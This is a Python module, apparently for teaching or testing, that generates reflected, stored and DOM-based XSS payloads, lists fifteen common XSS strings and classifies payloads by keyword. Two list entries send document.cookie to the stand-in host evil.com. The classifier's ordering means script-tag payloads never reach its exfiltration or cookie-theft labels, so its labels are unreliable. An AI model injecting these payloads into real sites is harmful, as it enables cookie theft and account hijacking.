def simulate_xss_attack(input_text, attack_type="reflected"):
    if attack_type == "reflected":
        return f"<script>alert('XSS');</script>{input_text}"
    elif attack_type == "stored":
        return f"{input_text}<img src='x' onerror='alert(\"XSS\")'>"
    elif attack_type == "dom":
        return f"javascript:eval('alert(\"XSS\")')"
    else:
        return input_text

def get_common_xss_patterns():
    return [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(\"XSS\")'>",
        "<svg onload='alert(\"XSS\")'>",
        "<body onload='alert(\"XSS\")'>",
        "<iframe src='javascript:alert(\"XSS\")'>",
        "<a href='javascript:alert(\"XSS\")'>Click me</a>",
        "<div style='background-image: url(javascript:alert(\"XSS\"))'>",
        "'-alert(\"XSS\")-'",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
        "<script>document.location='https://evil.com?cookie='+document.cookie</script>",
        "<svg><animate onbegin='alert(1)' attributeName='x' dur='1s'></animate></svg>",
        "javascript:eval('alert(\"XSS\")')",
        "<marquee onstart='alert(\"XSS\")'>XSS</marquee>",
        "<details ontoggle='alert(\"XSS\")'>",
        "<div onmouseover='alert(\"XSS\")'>Hover me</div>"
    ]

def classify_xss_type(payload):
    payload = payload.lower()
    
    if "<script>" in payload:
        return "Script Injection"
    elif "onerror" in payload or "onload" in payload or "onmouseover" in payload:
        return "Event Handler Injection"
    elif "javascript:" in payload:
        return "JavaScript URI"
    elif "eval(" in payload or "function(" in payload:
        return "JavaScript Evaluation"
    elif "fetch(" in payload or "xmlhttp" in payload:
        return "Data Exfiltration"
    elif "document.cookie" in payload:
        return "Cookie Theft"
    elif "document.location" in payload or "window.location" in payload:
        return "Redirection"
    
    return "Unknown/Other"